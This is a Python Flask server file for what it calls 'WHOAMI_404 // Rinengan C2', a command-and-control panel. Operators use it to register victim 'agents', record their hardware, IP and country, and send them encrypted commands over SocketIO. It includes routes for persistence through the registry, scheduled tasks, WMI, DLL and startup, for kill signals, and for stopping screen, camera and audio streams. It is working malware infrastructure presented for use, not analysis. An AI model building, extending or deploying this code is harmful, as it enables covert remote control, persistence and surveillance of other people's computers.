import warnings
warnings.filterwarnings("ignore", category=Warning)
warnings.filterwarnings("ignore", message=".*RequestsDependencyWarning.*")

from flask import Flask, render_template, request, redirect, url_for, session, jsonify, make_response
from flask_sqlalchemy import SQLAlchemy
from flask_socketio import SocketIO
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_wtf.csrf import CSRFProtect, generate_csrf
from models import db, User, Agent, Command, Webhook
from config import Config
from utils import get_client_ip, is_ip_allowed, generate_agent_secret, encrypt_webhook_url, decrypt_webhook_url, generate_uuid, encrypt_command_payload, decrypt_command_payload, resolve_country
from socket_events import socketio, start_stale_agent_sweeper
from datetime import datetime, timedelta
import bcrypt
import pyotp
import json

app = Flask(__name__)
app.config.from_object(Config)
db.init_app(app)
socketio.init_app(app)
csrf = CSRFProtect(app)
limiter = Limiter(get_remote_address, app=app, default_limits=["200 per day", "50 per hour"], storage_uri="memory://")

# Create tables & auto-migrate missing columns
with app.app_context():
    db.create_all()
    try:
        from sqlalchemy import inspect, text
        inspector = inspect(db.engine)
        if 'user' in inspector.get_table_names():
            columns = [c['name'] for c in inspector.get_columns('user')]
            with db.engine.connect() as conn:
                if 'totp_setup_complete' not in columns:
                    conn.execute(text('ALTER TABLE user ADD COLUMN totp_setup_complete BOOLEAN DEFAULT 0'))
                if 'active_session_token' not in columns:
                    conn.execute(text('ALTER TABLE user ADD COLUMN active_session_token VARCHAR(64)'))
                if 'last_activity' not in columns:
                    conn.execute(text('ALTER TABLE user ADD COLUMN last_activity DATETIME'))
                conn.commit()
        if 'agent' in inspector.get_table_names():
            agent_cols = [c['name'] for c in inspector.get_columns('agent')]
            with db.engine.connect() as conn:
                if 'custom_name' not in agent_cols:
                    conn.execute(text('ALTER TABLE agent ADD COLUMN custom_name VARCHAR(255)'))
                conn.commit()
    except Exception as e:
        app.logger.warning(f"Auto-migration note: {e}")

    start_stale_agent_sweeper(app)


@app.before_request
def check_single_session():
    # Public endpoints that don't require session check
    exempt_endpoints = {'login', 'setup', 'logout', 'static', 'api_agent_register'}
    if request.endpoint in exempt_endpoints or (request.path and request.path.startswith('/static/')):
        return

    if 'user_id' in session:
        user_id = session.get('user_id')
        session_token = session.get('session_token')
        user = db.session.get(User, user_id) if hasattr(db.session, 'get') else User.query.get(user_id)
        if not user or not user.active_session_token or user.active_session_token != session_token:
            session.clear()
            if request.path.startswith('/api/'):
                return jsonify({'error': 'session_invalidated', 'message': 'Session expired or active operator logged in elsewhere.'}), 401
            return redirect(url_for('login'))
        else:
            now = datetime.utcnow()
            if not user.last_activity or (now - user.last_activity).total_seconds() > 10:
                user.last_activity = now
                db.session.commit()

# -------------------- AUTH --------------------
@app.route('/setup', methods=['GET', 'POST'])
def setup():
    if User.query.count() > 0:
        return redirect(url_for('login'))
    if request.method == 'POST':
        username = (request.form.get('username') or 'admin').strip()
        password = request.form.get('password')
        confirm = request.form.get('confirm')
        panel_url = (request.form.get('panel_url') or '').strip()
        
        if not username or len(username) < 3:
            return render_template('setup.html', error='Username must be at least 3 characters')
        if not password or len(password) < 8:
            return render_template('setup.html', error='Password must be at least 8 characters')
        if confirm is not None and password != confirm:
            return render_template('setup.html', error='Passwords do not match')
            
        new_token = generate_uuid()
        now = datetime.utcnow()
        user = User(username=username)
        user.set_password(password)
        user.totp_secret = None
        user.active_session_token = new_token
        user.last_activity = now
        user.last_login = now
        db.session.add(user)
        db.session.commit()
        
        session['user_id'] = user.id
        session['session_token'] = new_token
        session.permanent = True
        return redirect(url_for('panel'))
    return render_template('setup.html')


@app.route('/login', methods=['GET', 'POST'])
@limiter.limit("100 per 15 minutes")
def login():
    if User.query.count() == 0:
        return redirect(url_for('setup'))

    # If already logged in with valid token in current session, redirect to panel
    if 'user_id' in session and session.get('session_token'):
        user = db.session.get(User, session['user_id']) if hasattr(db.session, 'get') else User.query.get(session['user_id'])
        if user and user.active_session_token == session.get('session_token'):
            return redirect(url_for('panel'))

    if request.method == 'POST':
        username = (request.form.get('username') or '').strip()
        password = request.form.get('password')
        totp_code = request.form.get('totp')
        ip = get_client_ip(request)
        if not is_ip_allowed(ip):
            return render_template('login.html', error='IP not whitelisted'), 403

        user = User.query.filter_by(username=username).first()
        if user and user.check_password(password):
            now = datetime.utcnow()

            if user.totp_secret and user.totp_setup_complete:
                if not totp_code:
                    return render_template('login.html', require_totp=True)
                totp_code_clean = str(totp_code).replace(' ', '').replace('-', '').strip()
                totp = pyotp.TOTP(user.totp_secret)
                if not totp.verify(totp_code_clean, valid_window=2):
                    return render_template('login.html', error='Invalid 2FA Authenticator Code', require_totp=True)

            new_token = generate_uuid()
            user.active_session_token = new_token
            user.last_activity = now
            user.last_login = now
            db.session.commit()

            session['user_id'] = user.id
            session['session_token'] = new_token
            session.permanent = True
            return redirect(url_for('panel'))
        else:
            return render_template('login.html', error='Invalid credentials')
    return render_template('login.html')

@app.route('/logout')
def logout():
    if 'user_id' in session:
        user_id = session.get('user_id')
        user = db.session.get(User, user_id) if hasattr(db.session, 'get') else User.query.get(user_id)
        if user and user.active_session_token == session.get('session_token'):
            user.active_session_token = None
            db.session.commit()
    try:
        socketio.emit('stop_webrtc', {'stream_type': 'all'})
        socketio.emit('stop_screen', {})
        socketio.emit('stop_camera', {})
        socketio.emit('stop_audio', {})
    except Exception:
        pass
    session.clear()
    return redirect(url_for('login'))

# -------------------- PANEL --------------------
@app.route('/')
def index():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    return render_template('panel.html')

@app.route('/panel')
def panel():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    return render_template('panel.html')

# -------------------- API (REST) --------------------
@app.route('/api/agents/register', methods=['POST'])
@csrf.exempt
def api_agent_register():
    data = request.get_json() or {}
    agent_id = data.get('agent_id') or generate_uuid()
    secret = data.get('secret_key') or generate_agent_secret()
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    if not agent:
        client_ip = get_client_ip(request)
        agent = Agent(
            agent_id=agent_id,
            secret_key=secret,
            hostname=data.get('hostname', ''),
            os=data.get('os', ''),
            os_version=data.get('os_version', ''),
            cpu=data.get('cpu', ''),
            gpu=data.get('gpu', ''),
            ram=data.get('ram', 0),
            ip=client_ip,
            country=resolve_country(client_ip)
        )
        db.session.add(agent)
        db.session.commit()
    else:
        if agent.secret_key != secret:
            return jsonify({'error': 'unauthorized'}), 401
        if data.get('hostname'): agent.hostname = data['hostname']
        if data.get('os'): agent.os = data['os']
        if data.get('os_version'): agent.os_version = data['os_version']
        if data.get('cpu'): agent.cpu = data['cpu']
        if data.get('gpu'): agent.gpu = data['gpu']
        if data.get('ram'): agent.ram = data['ram']
        agent.ip = get_client_ip(request)
        if not agent.country or agent.country in ('-', 'US', ''):
            agent.country = resolve_country(agent.ip)
        agent.online = True
        agent.last_heartbeat = datetime.utcnow()
        db.session.commit()
    socketio.emit('agent_update', agent.to_dict(), to='panel')
    return jsonify({
        'agent_id': agent.agent_id,
        'secret_key': agent.secret_key,
        'heartbeat_interval': agent.heartbeat_interval,
        'status': 'registered'
    })

@app.route('/api/agents')
def api_agents():
    if 'user_id' not in session:
        return jsonify({'error': 'unauthorized'}), 401
    agents = Agent.query.all()
    now = datetime.utcnow()
    changed = False
    for a in agents:
        if a.last_heartbeat and a.online and (now - a.last_heartbeat > timedelta(seconds=180)):
            a.online = False
            changed = True
    if changed:
        db.session.commit()
    return jsonify([a.to_dict() for a in agents])

@app.route('/api/agents/<agent_id>/command', methods=['POST'])
@csrf.exempt
@limiter.exempt
def api_send_command(agent_id):
    if 'user_id' not in session:
        return jsonify({'error': 'unauthorized'}), 401
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    if not agent:
        return jsonify({'error': 'agent not found'}), 404
    data = request.get_json()
    command = data.get('command')
    params = data.get('params', {})
    if not command:
        return jsonify({'error': 'command required'}), 400
    # Generate UUID
    uuid = generate_uuid()
    cmd = Command(uuid=uuid, agent_id=agent.id, command=command, parameters=json.dumps(params))
    db.session.add(cmd)
    db.session.commit()
    # Encrypt payload with agent's secret
    payload = {'uuid': uuid, 'command': command, 'params': params}
    encrypted = encrypt_command_payload(payload, agent.secret_key)
    # Send via SocketIO to agent room
    socketio.emit('execute', {'uuid': uuid, 'payload': encrypted}, to=f'agent_{agent.id}')
    cmd.status = 'sent'
    cmd.sent_at = datetime.utcnow()
    db.session.commit()
    return jsonify({'uuid': uuid, 'status': 'sent'})

@app.route('/api/agents/<agent_id>/rename', methods=['POST'])
@csrf.exempt
def api_rename_agent(agent_id):
    if 'user_id' not in session:
        return jsonify({'error': 'unauthorized'}), 401
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    if not agent:
        return jsonify({'error': 'agent not found'}), 404
    data = request.get_json() or {}
    new_name = data.get('new_name', '').strip()
    if not new_name:
        return jsonify({'error': 'new_name required'}), 400
    agent.custom_name = new_name
    db.session.commit()
    socketio.emit('agent_update', agent.to_dict(), to='panel')
    return jsonify({'status': 'success', 'agent_id': agent_id, 'custom_name': new_name})

@app.route('/api/agents/<agent_id>', methods=['DELETE'])
@csrf.exempt
def api_delete_agent(agent_id):
    if 'user_id' not in session:
        return jsonify({'error': 'unauthorized'}), 401
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    if not agent:
        return jsonify({'error': 'agent not found'}), 404
    
    # Notify agent to kill process via SocketIO if connected
    try:
        socketio.emit('kill', {}, to=f'agent_{agent.id}')
    except Exception:
        pass

    # Delete associated commands
    Command.query.filter_by(agent_id=agent.id).delete()
    
    # Delete the agent
    db.session.delete(agent)
    db.session.commit()
    
    socketio.emit('agent_deleted', {'agent_id': agent_id}, to='panel')
    return jsonify({'status': 'deleted'})

@app.route('/api/webhooks', methods=['GET', 'POST', 'DELETE'])
def api_webhooks():
    if 'user_id' not in session:
        return jsonify({'error': 'unauthorized'}), 401
    if request.method == 'GET':
        webhooks = Webhook.query.all()
        result = []
        for w in webhooks:
            decrypted_url = ''
            if w.encrypted_url:
                try:
                    decrypted_url = decrypt_webhook_url(w.encrypted_url)
                except Exception:
                    decrypted_url = w.url or ''
            result.append({
                'id': w.id,
                'description': w.description,
                'active': w.active,
                'url': decrypted_url
            })
        return jsonify(result)
    elif request.method == 'POST':
        data = request.get_json()
        url = data.get('url')
        desc = data.get('description', '')
        if not url:
            return jsonify({'error': 'url required'}), 400
        encrypted = encrypt_webhook_url(url)
        webhook = Webhook(url=url, description=desc, encrypted_url=encrypted)
        db.session.add(webhook)
        db.session.commit()
        return jsonify({'id': webhook.id, 'status': 'created'})
    elif request.method == 'DELETE':
        id = request.args.get('id')
        if not id:
            return jsonify({'error': 'id required'}), 400
        webhook = Webhook.query.get(id)
        if webhook:
            db.session.delete(webhook)
            db.session.commit()
            return jsonify({'status': 'deleted'})
        return jsonify({'error': 'not found'}), 404

@app.route('/api/agents/<agent_id>/persistence', methods=['POST'])
@csrf.exempt
def api_persistence(agent_id):
    if 'user_id' not in session:
        return jsonify({'error': 'unauthorized'}), 401
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    if not agent:
        return jsonify({'error': 'agent not found'}), 404
    data = request.get_json()
    method = data.get('method')  # registry, task, wmi, dll, startup
    if not method:
        return jsonify({'error': 'method required'}), 400
    # Create a command for the agent
    uuid = generate_uuid()
    cmd = Command(uuid=uuid, agent_id=agent.id, command='persistence', parameters=json.dumps({'method': method}))
    db.session.add(cmd)
    db.session.commit()
    payload = {'uuid': uuid, 'command': 'persistence', 'params': {'method': method}}
    encrypted = encrypt_command_payload(payload, agent.secret_key)
    socketio.emit('execute', {'uuid': uuid, 'payload': encrypted}, to=f'agent_{agent.id}')
    return jsonify({'uuid': uuid, 'status': 'sent'})

# -------------------- CSRF TOKEN --------------------
@app.after_request
def after_request(response):
    csrf_token = generate_csrf()
    response.set_cookie('csrf_token', csrf_token, httponly=False, secure=app.config.get('SESSION_COOKIE_SECURE', False), samesite='Lax')
    return response



# -------------------- GOOGLE AUTHENTICATOR / TOTP --------------------
@app.route('/api/totp/status', methods=['GET'])
def api_totp_status():
    if 'user_id' not in session:
        return jsonify({'error': 'unauthorized'}), 401
    user = db.session.get(User, session['user_id'])
    if not user:
        return jsonify({'error': 'user not found'}), 404
    
    if not user.totp_secret:
        user.totp_secret = pyotp.random_base32()
        user.totp_setup_complete = False
        db.session.commit()

    # Single-device security: If setup is complete, lock & do NOT reveal QR URI or Secret key to any client
    if user.totp_setup_complete:
        return jsonify({
            'enabled': True,
            'setup_complete': True,
            'secret': None,
            'qr_uri': None
        })

    totp = pyotp.TOTP(user.totp_secret)
    qr_uri = totp.provisioning_uri(name=user.username, issuer_name="WHOAMI_404 C2")

    return jsonify({
        'enabled': True,
        'setup_complete': False,
        'secret': user.totp_secret,
        'qr_uri': qr_uri
    })

@app.route('/api/totp/verify-setup', methods=['POST'])
@csrf.exempt
def api_totp_verify_setup():
    if 'user_id' not in session:
        return jsonify({'error': 'unauthorized'}), 401
    user = db.session.get(User, session['user_id'])
    if not user:
        return jsonify({'error': 'user not found'}), 404

    if not user.totp_secret:
        return jsonify({'success': False, 'error': '2FA secret not initialized'}), 400

    data = request.get_json() or {}
    code = str(data.get('code', '')).replace(' ', '').replace('-', '').strip()

    if not code:
        return jsonify({'success': False, 'error': '6-digit Authenticator Code required'}), 400

    totp = pyotp.TOTP(user.totp_secret)
    if totp.verify(code, valid_window=2):
        user.totp_setup_complete = True
        db.session.commit()
        return jsonify({'success': True, 'message': 'Google Authenticator paired successfully to single device & locked!'})
    else:
        return jsonify({'success': False, 'error': 'Invalid 2FA Authenticator Code. Ensure key matches mobile app and device time is synced.'}), 400

@app.route('/api/totp/reset', methods=['POST'])
@csrf.exempt
def api_totp_reset():
    if 'user_id' not in session:
        return jsonify({'error': 'unauthorized'}), 401
    user = db.session.get(User, session['user_id'])
    if not user:
        return jsonify({'error': 'user not found'}), 404

    data = request.get_json() or {}
    code = str(data.get('code', '')).replace(' ', '').replace('-', '').strip()

    if user.totp_setup_complete:
        if not code:
            return jsonify({'success': False, 'error': 'Current 2FA Code required to reset'}), 400
        totp = pyotp.TOTP(user.totp_secret)
        if not totp.verify(code, valid_window=2):
            return jsonify({'success': False, 'error': 'Invalid 2FA Authenticator Code'}), 400

    user.totp_secret = pyotp.random_base32()
    user.totp_setup_complete = False
    db.session.commit()

    return jsonify({'success': True, 'message': '2FA reset successfully. You can now pair a new device.'})

@app.route('/api/totp/verify', methods=['POST'])
@csrf.exempt
def api_totp_verify():
    if 'user_id' not in session:
        return jsonify({'error': 'unauthorized'}), 401
    user = db.session.get(User, session['user_id'])
    if not user:
        return jsonify({'error': 'user not found'}), 404

    if not user.totp_secret or not user.totp_setup_complete:
        return jsonify({'success': True, 'message': '2FA not configured – bypassing code check'})

    data = request.get_json() or {}
    code = str(data.get('code', '')).replace(' ', '').replace('-', '').strip()

    if not code:
        return jsonify({'success': False, 'error': '2FA Code required'}), 400

    totp = pyotp.TOTP(user.totp_secret)
    if totp.verify(code, valid_window=2):
        return jsonify({'success': True, 'message': '2FA Verified successfully'})
    else:
        return jsonify({'success': False, 'error': 'Invalid 2FA Authenticator Code'}), 400


# -------------------- MAIN --------------------
if __name__ == '__main__':
    import os
    preferred_port = int(os.environ.get('PORT', getattr(Config, 'PORT', 33875)))
    candidate_ports = [preferred_port, 33875, 8080, 8000, 5500, 9000, 5000]
    candidate_ports = list(dict.fromkeys(candidate_ports))

    started = False
    for candidate in candidate_ports:
        try:
            print(f"[*] Starting WHOAMI_404 // Rinengan C2 on http://127.0.0.1:{candidate}")
            socketio.run(app, host='0.0.0.0', port=candidate, debug=True, use_reloader=False, allow_unsafe_werkzeug=True)
            started = True
            break
        except OSError as e:
            print(f"[!] Port {candidate} unavailable or restricted by OS permissions: {e}")

    if not started:
        print("[!] Critical Error: Unable to bind to any available port.")

